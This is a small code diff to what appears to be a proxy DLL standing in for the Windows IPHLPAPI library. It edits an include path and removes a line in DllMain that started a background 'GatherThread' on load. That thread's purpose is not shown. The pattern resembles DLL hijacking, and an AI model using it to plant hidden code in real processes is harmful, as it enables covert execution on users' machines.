@@ -1,5 +1,5 @@
 #include <windows.h>
-#include "IPHLPAPI\InitState.h"
+#include "InitState.h"
 
 #pragma pack(1)
 
@@ -287,8 +287,6 @@ BOOL WINAPI DllMain(HINSTANCE hInst,DWORD reason,LPVOID)
 		p[266] = GetProcAddress(hL,"register_icmp");
 
 		InitiateStates();
-		CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)GatherThread, NULL, NULL, NULL);
-		
 
 		}
 	if (reason == DLL_PROCESS_DETACH)
